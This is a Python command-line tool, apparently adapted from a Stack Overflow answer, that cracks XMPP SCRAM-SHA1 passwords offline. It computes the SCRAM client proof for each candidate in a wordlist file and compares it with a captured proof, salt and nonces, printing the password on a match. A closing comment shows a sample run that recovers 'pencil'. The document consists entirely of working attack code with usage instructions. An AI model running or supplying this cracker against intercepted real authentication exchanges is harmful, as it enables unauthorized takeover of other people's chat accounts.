#src https://stackoverflow.com/questions/29298346/xmpp-sasl-scram-sha1-authentication 
import hashlib
import hmac
import base64
import sys

def SCRAMSHA1_Compute_Proof_And_Signature(username, password, b64_salt, b64_serverNonce, b64_clientNonce, iterations=4096):
    normalizedPassword = password
    salt = base64.b64decode(b64_salt)
    salted_password = hashlib.pbkdf2_hmac('sha1', normalizedPassword.encode(), salt, iterations)
    clientKey = hmac.new(salted_password, b"Client Key", hashlib.sha1).digest()
    storedKey = hashlib.sha1(clientKey).digest()
    authMessage = f"n={username},r={b64_clientNonce},r={b64_clientNonce}{b64_serverNonce},s={b64_salt},i={iterations},c=biws,r={b64_clientNonce}{b64_serverNonce}"
    clientSignature = hmac.new(storedKey, authMessage.encode(), hashlib.sha1).digest()
    clientProof = bytes([ck ^ cs for ck, cs in zip(clientKey, clientSignature)])
    serverKey = hmac.new(salted_password, b"Server Key", hashlib.sha1).digest()
    serverSignature = hmac.new(serverKey, authMessage.encode(), hashlib.sha1).digest()

    b64_clientProof = base64.b64encode(clientProof).decode('utf-8')
    b64_serverSignature = base64.b64encode(serverSignature).decode('utf-8')

    return b64_clientProof, b64_serverSignature

def SCRAMSHA1_Bruteforce_Password(target_b64Proof, rainbow_table, username, b64_salt, b64_serverNonce, b64_clientNonce, iterations=4096):
    try:
        with open(rainbow_table, 'r', encoding='utf-8') as file:
            i = 0
            for line in file:
                candidate = line.strip()
                if len(candidate) == 0:
                    continue
                sys.stdout.write("\r" + " " * 150 + "\r")
                sys.stdout.write("\r	=> Testing candidate: {:<20}".format(candidate))
                sys.stdout.flush()
                b64_proof, _ = SCRAMSHA1_Compute_Proof_And_Signature(username, candidate, b64_salt, b64_serverNonce, b64_clientNonce, iterations)
                sys.stdout.write("\n	=> Computed Proof: {:<32}".format(b64_proof))
                sys.stdout.flush()
                if b64_proof == target_b64Proof:
                    print("\n\n" + "-" * 100)
                    sys.stdout.write("[!!!] Password Cracked: {}\n".format(candidate))
                    sys.exit(0)
                else:
                    i += 1
                    sys.stdout.write(f"\n	=> Candidate N°: {i}")
                    sys.stdout.write("\033[F\033[F")
                    sys.stdout.flush()
    except FileNotFoundError:
        print(f"[x] Error: file {rainbow_table} not found.")

if __name__ == "__main__":
    print("-" * 100)
    print("				SCRAMSHA1 / XMPP password bruteforce			")
    print("        usage : python3 <script>.py <target proof> <rainbow table file> <user> <salt> <server Nonce> <client Nonce>                ")  
    print("-" * 100)
    target_b64Proof = sys.argv[1]
    rt = sys.argv[2]
    user = sys.argv[3]
    b64_salt = sys.argv[4]
    b64_serverNonce = sys.argv[5]
    b64_clientNonce = sys.argv[6]
    SCRAMSHA1_Bruteforce_Password(target_b64Proof, rt, user, b64_salt, b64_serverNonce, b64_clientNonce, iterations=4096)

#test python3 XMPPbis.py v0X8v3Bz2T0CJGbJQyF0X+HI4Ts= rttest.txt user QSXCR+Q6sek8bf92 3rfcNHYJY1ZVvWVs7j fyko+d2lbbFgONRv9qkxdawL => password expected : pencil






